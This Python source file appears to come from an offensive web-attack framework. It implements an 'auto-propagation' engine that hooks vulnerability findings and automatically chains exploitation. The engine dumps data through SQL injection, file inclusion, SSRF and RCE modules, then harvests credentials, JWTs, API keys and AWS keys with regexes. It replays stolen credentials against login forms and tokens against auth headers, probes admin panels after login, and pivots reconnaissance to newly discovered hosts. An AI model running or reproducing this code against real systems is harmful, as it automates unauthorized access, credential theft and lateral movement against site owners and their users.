# core/spread.py — auto-propagation engine. When a finding is logged, decide
# what post-exploitation action to take next, automatically.

import re
from pathlib import Path
from typing import Callable


class SpreadEngine:
    """
    Auto-propagation engine.

    Hooks into logger.finding(). When a module reports a finding, the engine:
      1. Classifies the finding (sqli, lfi, ssrf, xxe, creds, token, etc.)
      2. Decides the next action based on type
      3. Runs the action module (dump, credential reuse, deeper recon)
      4. Extracts new artifacts from results (creds, tokens, paths)
      5. Repeats (bounded depth)

    Chains are bound by:
      - max_depth (default 3) — prevents infinite loops
      - max_actions (default 30) — global action budget
      - visited (set) — don't run same action twice on same target+kind
    """

    # Which module to call for each finding type
    CHAIN_MAP = {
        "sqli":            [("dump", "sqli_dump"), ("dump", "sqli_post_dump")],
        "sqli_error":      [("dump", "sqli_dump")],
        "sqli_time":       [("dump", "sqli_dump")],
        "sqli_boolean":    [("dump", "sqli_dump")],
        "sqli_union":      [("dump", "sqli_dump")],
        "sqli_post_error": [("dump", "sqli_post_dump")],
        "sqli_post_bypass":[("dump", "sqli_post_dump")],
        "lfi":             [("dump", "lfi_dump")],
        "lfi_log_poison":  [("dump", "rce_dump")],
        "ssrf":            [("dump", "ssrf_dump")],
        "xxe":             [("dump", "xxe_dump")],
        "rce":             [("dump", "rce_dump")],
        "rfi":             [("dump", "rce_dump")],
    }

    # After dumping, what to do with extracted artifacts
    POST_DUMP_CHAINS = {
        "credentials":     ["reuse_credentials"],
        "tokens":          ["reuse_tokens"],
        "aws_keys":        ["use_aws_keys"],
        "paths":           ["probe_paths"],
        "hosts":           ["scan_hosts"],
    }

    def __init__(self, session, logger, loader, max_depth=3, max_actions=30):
        self.session = session
        self.logger = logger
        self.loader = loader
        self.max_depth = max_depth
        self.max_actions = max_actions
        self.depth = 0
        self.actions_taken = 0
        self.visited = set()  # (target, kind, action)
        self.artifacts = {
            "credentials":  [],   # [(user, pass)]
            "tokens":       [],   # [jwt/api_key]
            "aws_keys":     [],   # [(access, secret)]
            "paths":        set(),
            "hosts":        set(),
            "emails":       set(),
            "admin_access": False,
        }
        self.triggered_chains = []  # for reporting

    # ---------- public API ----------

    def on_finding(self, kind, severity, detail):
        """
        Called by Logger when any module logs a finding.
        Decides whether to trigger follow-up actions.
        """
        if self.actions_taken >= self.max_actions:
            return
        if self.depth >= self.max_depth:
            return

        # 1. extract artifacts from this finding
        self._extract_from_text(detail)

        # 2. chain by kind
        actions = self.CHAIN_MAP.get(kind, [])
        # also try normalized variants (e.g. sqli_error → sqli)
        if not actions:
            base_kind = kind.split("_")[0]
            actions = self.CHAIN_MAP.get(base_kind, [])

        for cat, mod in actions:
            key = (self.session.target, kind, mod)
            if key in self.visited:
                continue
            self.visited.add(key)
            self._run_action(cat, mod, reason=f"chain from {kind}")

    def on_dump_complete(self, dump_result):
        """Called by dump modules after extracting data."""
        self._extract_from_obj(dump_result)
        self._trigger_post_dump_chains()

    # ---------- chain execution ----------

    def _run_action(self, cat, mod, reason=""):
        if self.actions_taken >= self.max_actions:
            return
        try:
            m = self.loader.load(cat, mod)
            if not m:
                return
            print(f"    [spread] {cat}/{mod} ({reason})", flush=True)
            self.actions_taken += 1
            self.logger.info("spread_action", cat=cat, mod=mod, reason=reason)
            self.triggered_chains.append(f"{cat}/{mod}")
            m.run(self.session, self.logger)
        except KeyboardInterrupt:
            raise
        except Exception as e:
            print(f"    [spread] {mod} failed: {type(e).__name__}", flush=True)
            self.logger.warn("spread_action_fail", mod=mod, error=str(e))

    def _trigger_post_dump_chains(self):
        """After extracting artifacts, decide next moves."""
        # 1. credential reuse
        if self.artifacts["credentials"]:
            self._reuse_credentials()

        # 2. token reuse
        if self.artifacts["tokens"]:
            self._reuse_tokens()

        # 3. AWS keys → use for cloud
        if self.artifacts["aws_keys"]:
            self._use_aws_keys()

        # 4. discovered paths → probe
        if self.artifacts["paths"]:
            self._probe_paths()

        # 5. discovered hosts → recon
        if self.artifacts["hosts"]:
            self._scan_hosts()

    # ---------- reuse actions ----------

    def _reuse_credentials(self):
        """Try all extracted credentials on all known login forms."""
        from core.http import HttpClient
        http = HttpClient(self.session, self.logger)
        base = self.session.target.rstrip("/")

        login_forms = [
            "/login", "/signin", "/doLogin", "/auth/login", "/api/login",
            "/admin/login", "/admin/login.jsp", "/login.jsp",
            "/wp-login.php", "/administrator", "/api/auth",
        ]
        field_sets = [
            ("username", "password"),
            ("user", "pass"),
            ("uid", "passw"),
            ("email", "password"),
            ("login", "password"),
        ]

        tried = set()
        for user, pw in self.artifacts["credentials"][:10]:
            for form in login_forms:
                for uf, pf in field_sets:
                    key = (form, uf, pf, user)
                    if key in tried:
                        continue
                    tried.add(key)
                    r = http.post(base + form, data={uf: user, pf: pw})
                    if not r:
                        continue
                    low = r.text.lower()
                    if any(k in low for k in ("welcome", "dashboard", "logout",
                                              "sign out", "my account", "admin")):
                        print(f"    [spread] ✓ LOGIN: {user}:{pw} @ {form}", flush=True)
                        self.logger.finding("spread_login_success", "critical",
                                            f"{user}:{pw} @ {form}")
                        self.artifacts["admin_access"] = True
                        # after login, try to deepen
                        self._post_login_deepen(form)
                        return

    def _reuse_tokens(self):
        """Try tokens as auth headers."""
        from core.http import HttpClient
        http = HttpClient(self.session, self.logger)
        for tok in self.artifacts["tokens"][:5]:
            for header in ["Authorization", "X-Auth-Token", "X-Api-Key", "Bearer"]:
                val = tok if header == "Bearer" else (f"Bearer {tok}" if header == "Authorization" else tok)
                r = http.get(self.session.target, headers={header: val})
                if r and r.status_code == 200:
                    print(f"    [spread] ✓ TOKEN: {header} accepted", flush=True)
                    self.logger.finding("spread_token_success", "high",
                                        f"{header}={tok[:30]}")
                    return

    def _use_aws_keys(self):
        """Use AWS keys to enumerate S3."""
        access, secret = self.artifacts["aws_keys"][0]
        print(f"    [spread] AWS keys found: {access[:10]}... — S3 enum", flush=True)
        self.logger.finding("spread_aws_keys", "critical",
                            f"AccessKey={access[:12]}...")
        # (real usage would need boto3 — leave as note for manual follow-up)

    def _probe_paths(self):
        """Probe paths extracted from findings."""
        from core.http import HttpClient
        http = HttpClient(self.session, self.logger)
        base = self.session.target.rstrip("/")
        for path in list(self.artifacts["paths"])[:20]:
            if not path.startswith("/"):
                continue
            r = http.get(base + path)
            if r and r.status_code == 200 and len(r.content) > 100:
                self.logger.finding("spread_path_accessible", "info", path)

    def _scan_hosts(self):
        """For each discovered host, run recon."""
        new_hosts = set(self.artifacts["hosts"]) - {self.session.target}
        for host in list(new_hosts)[:5]:
            print(f"    [spread] new host: {host}", flush=True)
            try:
                old_target = self.session.target
                self.session.target = host if host.startswith("http") else f"http://{host}"
                self.depth += 1
                for m in ["waf_detect", "tech_fingerprint"]:
                    self._run_action("recon", m, reason=f"host {host}")
                self.session.target = old_target
                self.depth -= 1
            except Exception:
                pass

    def _post_login_deepen(self, form_path):
        """After successful login, look for admin panel and deeper access."""
        from core.http import HttpClient
        http = HttpClient(self.session, self.logger)
        base = self.session.target.rstrip("/")
        admin_paths = [
            "/admin", "/admin/admin.jsp", "/admin/users", "/api/admin",
            "/api/users", "/api/v1/admin", "/dashboard", "/console",
            "/manage", "/manager/html",
        ]
        for path in admin_paths:
            r = http.get(base + path)
            if r and r.status_code == 200:
                print(f"    [spread] ✓ admin path: {path}", flush=True)
                self.logger.finding("spread_admin_access", "critical", path)

    # ---------- extraction ----------

    def _extract_from_text(self, text):
        if not text:
            return
        # user:pass patterns
        for m in re.findall(r"\b([a-zA-Z][a-zA-Z0-9_.\-]{2,20}):([a-zA-Z0-9!@#$%^&*_.\-]{5,30})\b", text):
            if m[0].lower() in ("http", "https", "ftp", "file", "ldap"):
                continue
            if m not in self.artifacts["credentials"]:
                self.artifacts["credentials"].append(m)
        # JWT
        for m in re.findall(r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+", text):
            if m not in self.artifacts["tokens"]:
                self.artifacts["tokens"].append(m)
        # API keys
        for m in re.findall(r"(?:sk_live|ghp|AIza|AKIA)[A-Za-z0-9_\-]{10,}", text):
            if m not in self.artifacts["tokens"]:
                self.artifacts["tokens"].append(m)
        # AWS key pair
        for m in re.findall(r"AKIA[0-9A-Z]{16}", text):
            self.artifacts["aws_keys"].append((m, "<secret-not-in-detail>"))
        # emails
        for m in re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", text):
            self.artifacts["emails"].add(m)
        # hosts
        for m in re.findall(r"https?://([a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})", text):
            self.artifacts["hosts"].add(m)
        # paths
        for m in re.findall(r"['\"](/[a-zA-Z0-9._\-/]{3,80})['\"]", text):
            self.artifacts["paths"].add(m)

    def _extract_from_obj(self, obj):
        if obj is None:
            return
        if isinstance(obj, dict):
            for v in obj.values():
                self._extract_from_obj(v)
        elif isinstance(obj, (list, tuple)):
            for v in obj:
                self._extract_from_obj(v)
        elif isinstance(obj, str):
            self._extract_from_text(obj)

    # ---------- summary ----------

    def summary(self):
        return {
            "actions_taken": self.actions_taken,
            "depth": self.depth,
            "credentials": len(self.artifacts["credentials"]),
            "tokens": len(self.artifacts["tokens"]),
            "aws_keys": len(self.artifacts["aws_keys"]),
            "paths": len(self.artifacts["paths"]),
            "hosts": len(self.artifacts["hosts"]),
            "admin_access": self.artifacts["admin_access"],
            "chains": self.triggered_chains,
        }


# ============ global hook ============

_engine = None

def attach(session, logger, loader, **kwargs):
    """Attach a SpreadEngine to the current logger."""
    global _engine
    _engine = SpreadEngine(session, logger, loader, **kwargs)
    _orig_finding = logger.finding

    def hooked_finding(kind, severity, detail, **kw):
        _orig_finding(kind, severity, detail, **kw)
        if _engine:
            try:
                _engine.on_finding(kind, severity, detail)
            except Exception as e:
                # never break the module because of spread failure
                print(f"    [spread] hook error: {type(e).__name__}: {e}", flush=True)

    logger.finding = hooked_finding
    return _engine

def engine():
    return _engine
